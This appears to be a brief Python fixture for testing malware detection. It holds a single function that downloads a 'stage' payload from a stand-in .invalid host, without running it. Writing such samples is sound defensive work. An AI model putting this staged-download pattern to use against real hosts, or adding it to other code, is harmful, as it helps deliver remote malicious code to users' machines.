# FIXTURE ONLY - synthetic detection test sample, not real malware
# Host is a non-existent .invalid domain.
import requests

SOURCE = "https://dl.example.invalid/stage.py"


def payload():
    return requests.get(SOURCE, timeout=10).text
